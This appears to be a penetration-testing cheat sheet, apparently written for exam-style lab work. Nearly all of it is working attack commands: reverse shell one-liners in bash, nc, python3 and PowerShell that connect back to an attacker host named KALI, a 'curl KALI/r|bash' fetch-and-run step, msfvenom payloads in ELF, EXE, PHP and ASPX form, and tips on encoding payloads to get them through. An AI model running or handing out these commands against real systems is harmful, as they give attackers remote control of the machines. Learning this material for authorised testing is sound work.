title: Reverse shell one-liners
inline_answer:
```
# bash
bash -c 'bash -i >& /dev/tcp/KALI/4444 0>&1'
# nc no -e
rm /tmp/f;mkfifo /tmp/f;nc KALI 4444 0</tmp/f|sh >/tmp/f 2>&1;rm /tmp/f
# python3
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("KALI",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
```

Mangled by a web param? URL-encode it, or stage a script and `curl KALI/r|bash`.

title: Upgrade to a fully interactive TTY
inline_answer:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg          # (type 'fg' blind, Enter)
export TERM=xterm; stty rows 50 cols 200
```

No python? `script -qc /bin/bash /dev/null`. Penelope auto-upgrades most shells — this is the manual path when it doesn't.

title: msfvenom — common payloads
inline_answer:
```
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=K LPORT=4444 -f elf -o s.elf
# Windows EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=K LPORT=4444 -f exe -o s.exe
# PHP / ASPX / WAR
msfvenom -p php/reverse_php LHOST=K LPORT=4444 -f raw -o s.php
msfvenom -p windows/x64/shell_reverse_tcp LHOST=K LPORT=4444 -f aspx -o s.aspx
```

`shell_reverse_tcp` (stageless) catches in Penelope; `meterpreter`/staged needs multi/handler.

title: Listener — Penelope (standard handler)
inline_answer:
```
penelope -0 4444        # the toolkit standard: auto-upgrade, logging, multi-session
```

Not `nc -lvnp`, not `rlwrap nc`, not `pwncat` — Penelope (`-0` = zero). Only use Metasploit `multi/handler` for staged/meterpreter payloads, and that costs your one Metasploit machine.

title: Windows reverse shells
inline_answer:
```
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('KALI',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}"
```

Or base64 it for `-EncodedCommand` (UTF-16LE). ConPtyShell for a real PTY. nc.exe / Invoke-PowerShellTcp as fallbacks.
